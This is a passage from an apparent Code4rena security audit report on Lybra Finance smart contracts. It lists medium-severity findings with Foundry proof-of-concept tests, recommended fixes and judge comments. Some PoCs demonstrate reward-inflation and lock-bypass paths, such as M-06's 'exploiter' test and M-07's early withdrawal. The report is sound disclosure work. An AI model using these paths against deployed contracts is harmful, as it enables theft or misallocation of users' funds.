*Submitted by [georgypetrov](https://github.com/code-423n4/2023-06-lybra-findings/issues/882), also found by [Kenshin](https://github.com/code-423n4/2023-06-lybra-findings/issues/786), [bart1e](https://github.com/code-423n4/2023-06-lybra-findings/issues/519), [DelerRH](https://github.com/code-423n4/2023-06-lybra-findings/issues/499), [pep7siup](https://github.com/code-423n4/2023-06-lybra-findings/issues/381), [ktg](https://github.com/code-423n4/2023-06-lybra-findings/issues/353), [SpicyMeatball](https://github.com/code-423n4/2023-06-lybra-findings/issues/292), [CrypticShepherd](https://github.com/code-423n4/2023-06-lybra-findings/issues/244), and [LuchoLeonel1](https://github.com/code-423n4/2023-06-lybra-findings/issues/225)*

### Lines of code

<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L18>

### Impact

Because of `vaultType` variable is internal `vaultType` staticcall to vaults from the configurator will revert, so it makes it impossible to change `safeCollateralRatio`. It may be critical when market conditions will change, something happens with ETH.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {GovernanceTimelock} from "@lybra/governance/GovernanceTimelock.sol";
import {LybraStETHDepositVault} from "@lybra/pools/LybraStETHVault.sol";
import {Configurator} from "@lybra/configuration/LybraConfigurator.sol";
import {mockEtherPriceOracle} from "@mocks/mockEtherPriceOracle.sol";
import {mockCurve} from "@mocks/mockCurve.sol";

/* remappings used
@lybra=contracts/lybra/
@mocks=contracts/mocks/
 */
contract LybraV2SafeCollateral is Test {

    GovernanceTimelock govTimeLock;
    mockEtherPriceOracle oracle;
    mockCurve curve;
    Configurator configurator;
    LybraStETHDepositVault stETHVault;
    address owner = address(7);
    // admins && executers of GovernanceTimelock
    address[] govTimelockArr;
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);

    function setUp() public {
        vm.startPrank(owner);
        oracle = new mockEtherPriceOracle();
        govTimelockArr.push(owner);
        govTimeLock = new GovernanceTimelock(
            1,
            govTimelockArr,
            govTimelockArr,
            owner
        );
        curve = new mockCurve();
        //  _dao , _curvePool
        configurator = new Configurator(address(govTimeLock), address(curve));

        stETHVault = new LybraStETHDepositVault(
            address(configurator),
            address(stETH),
            address(oracle)
        );
        vm.stopPrank();
    }

    function testSafeCollateral() public {
        vm.startPrank(owner);
        configurator.setSafeCollateralRatio(address(stETHVault), 165 * 1e18);
    }
    

}
```

### Tools Used

Foundry

### Recommended Mitigation Steps

Change getter function in `LybraConfigurator`:

```solidity
interface IVault {
    function getVaultType() external view returns (uint8);
}
...
...
if(IVault(pool).getVaultType() == 0) {
```

<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/configuration/LybraConfigurator.sol#L29>

<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/configuration/LybraConfigurator.sol#L199>

### Assessed type

DoS

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/882#issuecomment-1639584191)**

***

## [[M-04] The `EUSDMiningIncentives` contract is incorrectly implemented and can allow for more than the intended amount of rewards to be minted](https://github.com/code-423n4/2023-06-lybra-findings/issues/867)
*Submitted by [Toshii](https://github.com/code-423n4/2023-06-lybra-findings/issues/867), also found by [bytes032](https://github.com/code-423n4/2023-06-lybra-findings/issues/690)*

### Lines of code

<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L132-L134>
<br><https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L136-L147>

### Impact

The `EUSDMiningIncentives` contract is intended to function similarly to the Synthetix staking rewards contract. This means the rewards per second, defined as `rewardRatio`, which is set in the `notifyRewardAmount` function, is supposed to be distributed to users as an equivalent percentage of how much the user has staked as compared to the total amount staked. In this contract, the total amount staked is equal to the total supply of EUSD tokens. However, the calculated amount staked PER user is equal to the total amount borrowed of tokens (EUSD and PeUSD) across ALL vaults. This means, the amount returned by the `totalStaked` function is wrong, as it should also include the total supply of all the vaults which are included in the `pools` array (EUSD and PeUSD). This will effectively result in much more than the intended amount of rewards to be minted, as the numerator (total amount of EUSD and PeUSD) across all users is much more than the denominator (total amount of EUSD).

### Proof of Concept

First consider the `stakedOf` function, which sums up the borrowed amount across all vaults in the `pools` array (both EUSD and PeUSD):

```solidity
function stakedOf(address user) public view returns (uint256) {
    uint256 amount;
    for (uint i = 0; i < pools.length; i++) {
        ILybra pool = ILybra(pools[i]);
        uint borrowed = pool.getBorrowedOf(user);
        if (pool.getVaultType() == 1) {
            borrowed = borrowed * (1e20 + peUSDExtraRatio) / 1e20;
        }
        amount += borrowed;
    }
    return amount;
}
```

Then consider the `totalStaked` function, which just returns the total supply of EUSD:

```solidity
function totalStaked() internal view returns (uint256) {
    return EUSD.totalSupply();
}
```

The issue arrises in the `earned` function, which references both the `stakedOf` value and the `totalSupply` value:

```solidity
function earned(address _account) public view returns (uint256) { // @note - read
    return ((stakedOf(_account) * getBoost(_account) * (rewardPerToken() - userRewardPerTokenPaid[_account])) / 1e38) + rewards[_account];
}
```

Here, `stakedOf` (which includes EUSD and PeUSD), is multiplied by a call to `rewardPerToken` minus the old user reward debt. This function has `totalStaked()` in the denominator, which is where this skewed calculation is occurring:

```solidity
function rewardPerToken() public view returns (uint256) {
	...
	return rewardPerTokenStored + (rewardRatio * (lastTimeRewardApplicable() - updatedAt) * 1e18) / totalStaked();
}
```

This will effectively result in much more than the intended amount of rewards to be minted to the users, which will result in the supply of esLBR inflating much faster than intended.

### Tools Used

Manual review

### Recommended Mitigation Steps

The `totalStaked` function should be updated to sum up the `totalSupply` of EUSD and all the PeUSD vaults which are in the `pools` array.

### Assessed type

Math

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/867#issuecomment-1639589998)**

***

## [[M-05] Invalid implementation of prioritized token rewards distribution](https://github.com/code-423n4/2023-06-lybra-findings/issues/828)
*Submitted by [DelerRH](https://github.com/code-423n4/2023-06-lybra-findings/issues/828), also found by [DelerRH](https://github.com/code-423n4/2023-06-lybra-findings/issues/795), [ayden](https://github.com/code-423n4/2023-06-lybra-findings/issues/791), [bart1e](https://github.com/code-423n4/2023-06-lybra-findings/issues/722), [bart1e](https://github.com/code-423n4/2023-06-lybra-findings/issues/700), [adeolu](https://github.com/code-423n4/2023-06-lybra-findings/issues/660), [No12Samurai](https://github.com/code-423n4/2023-06-lybra-findings/issues/603), [LaScaloneta](https://github.com/code-423n4/2023-06-lybra-findings/issues/553), [HE1M](https://github.com/code-423n4/2023-06-lybra-findings/issues/501), [pep7siup](https://github.com/code-423n4/2023-06-lybra-findings/issues/445), [pep7siup](https://github.com/code-423n4/2023-06-lybra-findings/issues/427), [RedTiger](https://github.com/code-423n4/2023-06-lybra-findings/issues/265), [RedTiger](https://github.com/code-423n4/2023-06-lybra-findings/issues/262), and [f00l](https://github.com/code-423n4/2023-06-lybra-findings/issues/220)*

### Lines of code
<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L190-L218> 

### Vulnerability details

The `getReward` external function can't calculate and distribute rewards correctly for an account because of the reasons below:

*   Transferring EUSD while the contract EUSD balance is insufficient and reverting
*   Bad implementation of prioritized token rewards distribution when converting reward decimal for transfer stablecoin

### Impact

Users can't get rewards and rewards freeze.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {GovernanceTimelock} from "contracts/lybra/governance/GovernanceTimelock.sol";
import {mockCurve} from "contracts/mocks/mockCurve.sol";
import {Configurator} from "contracts/lybra/configuration/LybraConfigurator.sol";
import {LybraWBETHVault} from "contracts/lybra/pools/LybraWbETHVault.sol";
import {PeUSDMainnet} from "contracts/lybra/token/PeUSDMainnetStableVision.sol";
import {ProtocolRewardsPool} from "contracts/lybra/miner/ProtocolRewardsPool.sol";
import {EUSDMock} from "contracts/mocks/MockEUSD.sol";
import {LBR} from "contracts/lybra/token/LBR.sol";
import {esLBR} from "contracts/lybra/token/esLBR.sol";
import {esLBRBoost} from "contracts/lybra/miner/esLBRBoost.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// 6 decimal USDC mock
contract mockUSDC is ERC20 {
    constructor() ERC20("USDC", "USDC") {
        _mint(msg.sender, 1000000 * 1e6);
    }

    function claim() external returns (uint256) {
        _mint(msg.sender, 10000 * 1e6);
        return 10000 * 1e6;
    }

    function decimals() public view virtual override returns (uint8) {
        return 6;
    }
}

contract ProtocolRewardsPoolTest is Test {
    address goerliEndPoint = 0xbfD2135BFfbb0B5378b56643c2Df8a87552Bfa23;
    address wbETH = 0xbfD2135BFfbb0B5378b56643c2Df8a87552Bfa23;
    address deployer;
    address attacker;
    address alice;

    address[] proposers;
    address[] executors;
    address[] minerContracts;
    bool[] minerContractsBools;

    GovernanceTimelock governance;
    mockCurve curvePool;
    Configurator configurator;
    PeUSDMainnet peUsdMainnet;
    EUSDMock eUSD;
    mockUSDC usdc;
    LBR lbr;
    esLBR eslbr;
    esLBRBoost boost;
    LybraWBETHVault wbETHVault;
    ProtocolRewardsPool rewardsPool;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");
        alice = makeAddr("alice");
        vm.startPrank(deployer);
        proposers.push(deployer);
        executors.push(deployer);
        governance = new GovernanceTimelock(2, proposers, executors, deployer);
        curvePool = new mockCurve();
        configurator = new Configurator(address(governance), address(curvePool));
        peUsdMainnet = new PeUSDMainnet(
            address(configurator),
            8,
            goerliEndPoint
        );
        eUSD = new EUSDMock(address(configurator));
        // 6 decimal USDC token
        usdc = new mockUSDC();
        lbr = new LBR(address(configurator), 8, goerliEndPoint);
        eslbr = new esLBR(address(configurator));
        boost = new esLBRBoost();
        rewardsPool = new ProtocolRewardsPool(address(configurator));
        rewardsPool.setTokenAddress(address(eslbr), address(lbr), address(boost));
        // Ether oracle has no impact on this test
        wbETHVault =
        new LybraWBETHVault(address(peUsdMainnet), makeAddr("NonImportantMockForEtherOracle"), wbETH, address(configurator));
        configurator.setMintVault(deployer, true);
        configurator.initToken(address(eUSD), address(peUsdMainnet));
        configurator.setProtocolRewardsPool(address(rewardsPool));
        configurator.setProtocolRewardsToken(address(usdc));
        curvePool.setToken(address(eUSD), address(usdc));

        // Set minters
        minerContracts.push(address(deployer));
        minerContracts.push(address(rewardsPool));
        minerContractsBools.push(true);
        minerContractsBools.push(true);
        configurator.setTokenMiner(minerContracts, minerContractsBools);

        // Fund curve pool eusd/usdc
        eUSD.mint(address(curvePool), 10000 * 1e18);
        usdc.transfer(address(curvePool), 10000 * 1e6);

        // Fund ALice
        lbr.mint(address(alice), 100 * 1e18);
        vm.stopPrank();
    }

    function test_canGetReward() public {
        // Alice stake LBR
        vm.startPrank(alice);
        rewardsPool.stake(100 * 1e18);
        assertEq(eslbr.balanceOf(alice), 100 * 1e18);
        vm.stopPrank();

        // Notify reward amount
        vm.startPrank(deployer);
        eUSD.mint(address(configurator), 3000 * 1e18);
        configurator.setPremiumTradingEnabled(true);

        uint256 eusdPreBalance = eUSD.balanceOf(address(configurator));
        configurator.distributeRewards();
        curvePool.setPrice(1010000);
        uint256 price = curvePool.get_dy_underlying(0, 2, 1e18);
        uint256 outUSDC = eusdPreBalance * price * 998 / 1e21;
        assertEq(eUSD.sharesOf(address(rewardsPool)), 0);
        assertEq(usdc.balanceOf(address(rewardsPool)), outUSDC);

        configurator.distributeRewards();
        vm.stopPrank();

        uint256 newRewardPerTokenstored =
            outUSDC * 1e36 / (10 ** ERC20(configurator.stableToken()).decimals()) / eslbr.totalSupply();

        assertEq(rewardsPool.rewardPerTokenStored(), newRewardPerTokenstored);
        assertEq(rewardsPool.earned(alice), eslbr.balanceOf(alice) * (newRewardPerTokenstored - 0) / 1e18);
        uint256 earnedUSDC = rewardsPool.earned(alice);

        vm.startPrank(alice);
        rewardsPool.getReward();
        // earnedUSDC / 1e12 -> Because rewardsPool.earned output has 18 decimal and USDC has 6 decimals
        assertEq(usdc.balanceOf(alice), earnedUSDC / 1e12);
        vm.stopPrank();
    }
}

```

### Tools Used

Foundry

### Assessed type

Math

**[0xean (judge) decreased severity to Medium](https://github.com/code-423n4/2023-06-lybra-findings/issues/828#issuecomment-1656233155)**

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/828#issuecomment-1656654858)**

***

## [[M-06] Allowing `refreshReward()` to fail during minting or buring esLBR could result in gain or loss previously earned reward](https://github.com/code-423n4/2023-06-lybra-findings/issues/794)
*Submitted by [Kenshin](https://github.com/code-423n4/2023-06-lybra-findings/issues/794), also found by [0xNightRaven](https://github.com/code-423n4/2023-06-lybra-findings/issues/983), [Breeje](https://github.com/code-423n4/2023-06-lybra-findings/issues/841), and [totomanov](https://github.com/code-423n4/2023-06-lybra-findings/issues/41)*

### Lines of code

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/esLBR.sol#L33> <br><https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/esLBR.sol#L40>

### Impact

The esLBR balance of users plays the most important role in staking reward calculation. Using a try-catch statement over `refreshReward()` in the `esLBR.mint()` and `esLBR.burn()` functions can have the following effects when `refreshReward()` becomes unavailable:

*   Users can mint more esLBR, then manually call `refreshReward()` afterward for the contract to record the earned reward with the increased esLBR balance of the users. This results in users receiving more rewards than they should.
*   Users can be back run by a searcher or someone else calling `refreshReward(victim)` for the contract to record the earned reward with the decreased esLBR balance of the users. This results in users losing some of their rightful pending rewards that have not yet been recorded to the latest timestamp.

### Proof of Concept

The following is the coded PoC using [Foundry](https://github.com/foundry-rs/foundry).

*Note: This PoC creates a mock reward contract. It has the same logic as the real one, but with added setter functions that serve only to simplify the test flow.*

```solidity
File: test/esLBR.t.sol

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "contract/lybra/configuration/LybraConfigurator.sol";
import "contract/lybra/governance/GovernanceTimelock.sol";
import {esLBR} from "contract/lybra/token/esLBR.sol";

contract C4esLBRTest is Test {
    Configurator configurator;
    GovernanceTimelock govTimelock;
    mockProtocolRewardsPool rewardsPool;
    esLBR eslbr;

    address exploiter = address(0xfff);
    address victim = address(0xeee);

    function setUp() public {
        govTimelock = new GovernanceTimelock(0, new address[](0), new address[](0), address(0));
        configurator = new Configurator(address(govTimelock), address(0));
        rewardsPool = new mockProtocolRewardsPool();
        eslbr = new esLBR(address(configurator));

        rewardsPool.setTokenAddress(address(eslbr));

        address[] memory minter = new address[](1);
        minter[0] = address(this);
        bool[] memory minterBool = new bool[](1);
        minterBool[0] = true;
        configurator.setTokenMiner(minter, minterBool); // set this contract as the esLBR minter
        configurator.setProtocolRewardsPool(address(rewardsPool));

        eslbr.mint(exploiter, 100 ether);
        eslbr.mint(victim, 100 ether);
        rewardsPool.setRewardPerTokenStored(1);
    }

    function testMintFailRefreshReward() public {
        assertEq(eslbr.balanceOf(exploiter), eslbr.balanceOf(victim), "Should start with equal esLBR balance");
        assertEq(rewardsPool.earned(exploiter), rewardsPool.earned(victim), "Should start with equal rewards accrued");

        rewardsPool.setRewardPerTokenStored(2);

        eslbr.mint(victim, 100 ether); // refreshReward should pass
        rewardsPool.forceRevert(true); // Assume something occur, causing the refreshReward become unavailable
        eslbr.mint(exploiter, 100 ether);

        // Record earning rewards to latest rate
        rewardsPool.forceRevert(false);
        rewardsPool.refreshReward(exploiter);
        rewardsPool.refreshReward(victim);

        assertGt(rewardsPool.earned(exploiter), rewardsPool.earned(victim), "Exploiter should have more reward by this flaw");
    }

    function testBurnFailRefreshReward() public {
        assertEq(eslbr.balanceOf(exploiter), eslbr.balanceOf(victim), "Should start with equal esLBR balance");
        assertEq(rewardsPool.earned(exploiter), rewardsPool.earned(victim), "Should start with equal rewards accrued");

        rewardsPool.forceRevert(true); // Assume something occur, causing the refreshReward become unavailable
        eslbr.burn(victim, 100 ether); // The victim unstake during that time

        // Record earning rewards to latest rate
        rewardsPool.forceRevert(false);
        rewardsPool.refreshReward(exploiter);
        rewardsPool.refreshReward(victim);

        assertGt(rewardsPool.earned(exploiter), rewardsPool.earned(victim), "Victim should loss earned rewards by this flaw");
    }
}

contract mockProtocolRewardsPool {
    esLBR public eslbr;

    // Sum of (reward ratio * dt * 1e18 / total supply)
    uint public rewardPerTokenStored;
    // User address => rewardPerTokenStored
    mapping(address => uint) public userRewardPerTokenPaid;
    // User address => rewards to be claimed
    mapping(address => uint) public rewards;

    bool isForceRevert; // for mockup reverting on refreshreward

    function setTokenAddress(address _eslbr) external {
        eslbr = esLBR(_eslbr);
    }

    // User address => esLBR balance
    function stakedOf(address staker) internal view returns (uint256) {
        return eslbr.balanceOf(staker);
    }

    function earned(address _account) public view returns (uint) {
        return ((stakedOf(_account) * (rewardPerTokenStored - userRewardPerTokenPaid[_account])) / 1e18) + rewards[_account];
    }

    /**
     * @dev Call this function when deposit or withdraw ETH on Lybra and update the status of corresponding user.
     */
    modifier updateReward(address account) {
        if (isForceRevert) revert();
        rewards[account] = earned(account);
        userRewardPerTokenPaid[account] = rewardPerTokenStored;
        _;
    }

    function refreshReward(address _account) external updateReward(_account) {}

    function forceRevert(bool _isForce) external {
        isForceRevert = _isForce;
    }

    function setRewardPerTokenStored(uint value) external {
        rewardPerTokenStored = value;
    }
}
```

The test should pass without errors.

```shell
Running 2 tests for test/esLBR.t.sol:C4esLBRTest
[PASS] testBurnFailRefreshReward() (gas: 141678)
[PASS] testMintFailRefreshReward() (gas: 188308)
Test result: ok. 2 passed; 0 failed; finished in 2.50ms
```

Please follow this [gist](https://gist.github.com/t-nero/e97d8b9c7c5067b1638fe2b929b45456) if you prefer my instructions on how I setup the audit repo with Foundry environment.

### Tools Used
Manual review, Foundry

### Recommended Mitigation Steps

The `refreshReward()` function should be a mandatory action inside either the `mint()` or `burn()` functions. The try-catch statement should be removed.

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/794#issuecomment-1639626907)**

***

## [[M-07] `stakerewardV2pool.withdraw()` should check the user's boost lock status.](https://github.com/code-423n4/2023-06-lybra-findings/issues/773)
*Submitted by [KupiaSec](https://github.com/code-423n4/2023-06-lybra-findings/issues/773), also found by [Toshii](https://github.com/code-423n4/2023-06-lybra-findings/issues/884), [LaScaloneta](https://github.com/code-423n4/2023-06-lybra-findings/issues/838), [DedOhWale](https://github.com/code-423n4/2023-06-lybra-findings/issues/831), [0xRobocop](https://github.com/code-423n4/2023-06-lybra-findings/issues/803), [Kenshin](https://github.com/code-423n4/2023-06-lybra-findings/issues/787), [KupiaSec](https://github.com/code-423n4/2023-06-lybra-findings/issues/780), [Inspecktor](https://github.com/code-423n4/2023-06-lybra-findings/issues/756), [0xkazim](https://github.com/code-423n4/2023-06-lybra-findings/issues/739), [ke1caM](https://github.com/code-423n4/2023-06-lybra-findings/issues/571), [Hama](https://github.com/code-423n4/2023-06-lybra-findings/issues/145), [yudan](https://github.com/code-423n4/2023-06-lybra-findings/issues/98), and [Co0nan](https://github.com/code-423n4/2023-06-lybra-findings/issues/85)*

Users can withdraw their staking token immediately after charging more rewards using boost.

### Proof of Concept

`withdraw()` should prevent withdrawals during the boost lock, but there is no such logic.

The below steps show how users can charge more rewards without locking their funds.

1.  Alice stakes their funds using [stake()](https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/miner/stakerewardV2pool.sol#L83).
2.  They set the longest lock duration to get the highest boost using [setLockStatus()](https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/miner/esLBRBoost.sol#L38).
3.  After that, when they want to withdraw their staking funds, they call [withdraw()](https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/miner/stakerewardV2pool.sol#L93).

```solidity
    function withdraw(uint256 _amount) external updateReward(msg.sender) {
        require(_amount > 0, "amount = 0");
        balanceOf[msg.sender] -= _amount;
        totalSupply -= _amount;
        stakingToken.transfer(msg.sender, _amount);
        emit WithdrawToken(msg.sender, _amount, block.timestamp);
    }
```

4.  Then, the highest boost factor will be applied to their rewards in [earned()](https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/miner/stakerewardV2pool.sol#L106) and they can withdraw all of their staking funds and rewards immediately without checking any lock duration.

```solidity
    // Calculates and returns the earned rewards for a user
    function earned(address _account) public view returns (uint256) {
        return ((balanceOf[_account] * getBoost(_account) * (rewardPerToken() - userRewardPerTokenPaid[_account])) / 1e38) + rewards[_account];
    }
```

### Tools Used

Manual Review

### Recommended Mitigation Steps

`withdraw()` should check the boost lock like this:

```solidity
    function withdraw(uint256 _amount) external updateReward(msg.sender) {
        require(block.timestamp >= esLBRBoost.getUnlockTime(msg.sender), "Your lock-in period has not ended.");

        require(_amount > 0, "amount = 0");
        balanceOf[msg.sender] -= _amount;
        totalSupply -= _amount;
        stakingToken.transfer(msg.sender, _amount);
        emit WithdrawToken(msg.sender, _amount, block.timestamp);
    }
```

### Assessed type

Invalid Validation

**[LybraFinance acknowledged](https://github.com/code-423n4/2023-06-lybra-findings/issues/773#issuecomment-1635523068)**

**[0xean (judge) decreased severity to Medium](https://github.com/code-423n4/2023-06-lybra-findings/issues/773#issuecomment-1655658314)**

***

## [[M-08] `LybraPeUSDVaultBase.rigidRedemption` should use `getBorrowedOf` instead of `borrowed`](https://github.com/code-423n4/2023-06-lybra-findings/issues/679)
*Submitted by [cccz](https://github.com/code-423n4/2023-06-lybra-findings/issues/679)*

In `LybraPeUSDVaultBase`, the return value of `getBorrowedOf` represents the user's debt, while `borrowed` only represents the user's borrowed funds and does not include fees.
Using `borrowed` instead of `getBorrowedOf` in `rigidRedemption` results in:

1.  The requirement for the `peusdAmount` parameter is smaller than it actually is.
2.  The calculated `providerCollateralRatio` is larger, so that `rigidRedemption` can be performed, even if the actual `providerCollateralRatio` is less than 100e18.

```solidity
    function rigidRedemption(address provider, uint256 peusdAmount) external virtual {
        require(configurator.isRedemptionProvider(provider), "provider is not a RedemptionProvider");
        require(borrowed[provider] >= peusdAmount, "peusdAmount cannot surpass providers debt");
        uint256 assetPrice = getAssetPrice();
        uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / borrowed[provider];
        require(providerCollateralRatio >= 100 * 1e18, "provider's collateral ratio should more than 100%");
        _repay(msg.sender, provider, peusdAmount);
        uint256 collateralAmount = (((peusdAmount * 1e18) / assetPrice) * (10000 - configurator.redemptionFee())) / 10000;
        depositedAsset[provider] -= collateralAmount;
        collateralAsset.transfer(msg.sender, collateralAmount);
        emit RigidRedemption(msg.sender, provider, peusdAmount, collateralAmount, block.timestamp);
    }
```

### Proof of Concept

<https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L157-L168>

### Recommended Mitigation Steps

Change to:

```diff
    function rigidRedemption(address provider, uint256 peusdAmount) external virtual {
        require(configurator.isRedemptionProvider(provider), "provider is not a RedemptionProvider");
-       require(borrowed[provider] >= peusdAmount, "peusdAmount cannot surpass providers debt");
+       require(getBorrowedOf(provider) >= peusdAmount, "peusdAmount cannot surpass providers debt");
        uint256 assetPrice = getAssetPrice();
-       uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / borrowed[provider];
+       uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / getBorrowedOf(provider);
        require(providerCollateralRatio >= 100 * 1e18, "provider's collateral ratio should more than 100%");
        _repay(msg.sender, provider, peusdAmount);
        uint256 collateralAmount = (((peusdAmount * 1e18) / assetPrice) * (10000 - configurator.redemptionFee())) / 10000;
        depositedAsset[provider] -= collateralAmount;
        collateralAsset.transfer(msg.sender, collateralAmount);
        emit RigidRedemption(msg.sender, provider, peusdAmount, collateralAmount, block.timestamp);
    }
```

### Assessed type

Error

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/679#issuecomment-1639677893)**

***

## [[M-09] There is no mechanism that prevents from minting less than `esLBR` maximum supply in `StakingRewardsV2`](https://github.com/code-423n4/2023-06-lybra-findings/issues/647)
*Submitted by [bart1e](https://github.com/code-423n4/2023-06-lybra-findings/issues/647)*

### Lines of code

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/esLBR.sol#L30-L32> <br><https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/esLBR.sol#L20> <br><https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L73-L77>

### Vulnerability details

I'm assuming that esLBR is distributed as a reward in `StakingRewardsV2` - it's not clear from the docs. But `rewardsToken` is of type `IesLBR` and in order to calculate boost for rewards `esLBRBoost` contract is used, so I think that it's a reasonable assumption.

The esLBR token has a total supply of `100 000 000` and this is enforced in the `esLBR` contract:

```solidity
function mint(address user, uint256 amount) external returns (bool) {
        require(configurator.tokenMiner(msg.sender), "not authorized");
        require(totalSupply() + amount <= maxSupply, "exceeding the maximum supply quantity.");
```

However, the `StakingRewardsV2` contract which is approved to mint new esLBR tokens doesn't enforce that new tokens can always be minted.

Either due to admin mistake (it's possible to call `StakingRewardsV2::notifyRewardAmount` with arbitrarily high `_amount`, which is not validated; it's also possible to set `duration` to an arbitrarily low value, so `rewardRatio` may be very high), or by normal protocol functioning, `100 000 000` of esLBR may be finally minted.

If that happens, no user will be able to claim their reward via `getReward`, since `mint` will revert. It also won't be possible to stake esLBR tokens in `ProtocolRewardsPool` or call any functions that use `esLBR.mint` underneath.

### Impact

Lack of the possibility to stake esLBR is impacting important functionality of the protocol, while no possibility to withdraw earned rewards, this is a loss of assets for users.

From Code4Rena docs:

    3 - High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).

Here, assets definitely can be lost. Also, while it could happen because of a misconfiguration by the admin, it can also happen naturally, since esLBR is inflationary and there is no mechanism that enforces the supply being far enough from the max supply. The only thing that could be done to prevent it is that the admin would have to calculate the current supply, analyse the number of stakers, control staking boosts, and set reward ratio accordingly, which is hard to do and error prone.
Since assets can be lost and there aren't any needed external requirements here (and it doesn't have hand-wavy hypotheticals, in my opinion), I'm submitting this finding as High.

### Proof of Concept

Number of reward tokens that users get is calculated here: <br><https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/stakerewardV2pool.sol#L106-L108>

Users can get their rewards by calling `getReward`: <br><https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/stakerewardV2pool.sol#L111-L118>

There is no mechanism preventing too high `rewardRatio` when it's set: <br><https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/stakerewardV2pool.sol#L132-L145>

`mint` will fail on too high supply: <br><https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/esLBR.sol#L30-L36>

Users won't be able to claim acquired rewards, which is a loss of assets for them.

### Tools Used

VS Code

### Recommended Mitigation Steps

Do one of the following:

*   Introduce some mechanism that will enforce that esLBR max supply will never be achieved (something similar to Bitcoin halving, for example).
*   Do not set esLBR max supply (still do your best to limit it to `100 000 000`, but if it goes above that number, users will still be able to claim their acquired rewards).

### Assessed type

ERC20

**[LybraFinance acknowledged](https://github.com/code-423n4/2023-06-lybra-findings/issues/647#issuecomment-1635562951)**

**[0xean (judge) decreased severity to Low and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/647#issuecomment-1650696059):**
 > This comes down to input sanitization, which is typically awarded as QA.

**[0xean (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/647#issuecomment-1650696940):**
 > Thought about this one a bit more and since there is a possibility of the inputs being correct, but the emissions exceeding the max supply. M feels like the right severity. 

***

## [[M-10] Incorrect Reward Distribution Calculation in `ProtocolRewardsPool`](https://github.com/code-423n4/2023-06-lybra-findings/issues/604)
*Submitted by [No12Samurai](https://github.com/code-423n4/2023-06-lybra-findings/issues/604), also found by [Toshii](https://github.com/code-423n4/2023-06-lybra-findings/issues/869), [0xRobocop](https://github.com/code-423n4/2023-06-lybra-findings/issues/846), [kutugu](https://github.com/code-423n4/2023-06-lybra-findings/issues/593), and [Brenzee](https://github.com/code-423n4/2023-06-lybra-findings/issues/359)*

This report highlights a vulnerability in the `ProtocolRewardsPool` contract. The `getReward()` function, designed to distribute rewards to users, uses an incorrect calculation method that can result in incorrect reward distribution.

In the `ProtocolRewardsPool` contract, a user can call the `getReward()` function to receive the rewards. The function first tries to pay the reward using `eUSD` token, and if a sufficient amount of tokens are not available, it will use `peUSD`, and `stableToken` in the next steps. However, the protocol compares the number of shares with the amount of reward to send the reward.  If one share corresponds to a value greater than 1 `eUSD`, which is typically the case, users can be overpaid when claiming rewards. This can result in a significant discrepancy between the actual reward amount and the amount distributed.

### Proof of Concept

